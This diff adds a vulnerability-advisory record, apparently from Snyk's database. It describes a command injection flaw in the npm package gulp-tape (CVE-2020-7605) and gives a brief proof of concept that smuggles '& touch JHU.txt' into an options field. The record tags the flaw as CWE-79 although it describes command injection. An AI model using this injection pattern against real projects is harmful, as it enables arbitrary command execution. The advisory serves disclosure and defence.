@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:gulp-tape:560124
+  title: Command Injection
+  description: |
+    [gulp-tape][1] is a to run Tape tests in Gulp.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    It is possible to inject arbitrary commands as part of `gulp-tape`
+    options.
+
+    ### PoC   {#poc}
+
+        var root = require("gulp-tape");
+        var gulp = require("gulp");
+        var options = {
+          name: "& touch JHU.txt"
+        }
+        gulp.src("./gulp-tape.js")
+          .pipe(root(options));
+
+
+
+    [1]: https://www.npmjs.com/package/gulp-tape
+  affected_package: gulp-tape
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7605
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-03-13
+  created_date: 2020-03-13
+  last_modified_date: 2020-03-13
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/yuanqing/gulp-tape/blob/master/index.js#L38
+  source_url: https://snyk.io/vuln/SNYK-JS-GULPTAPE-560124
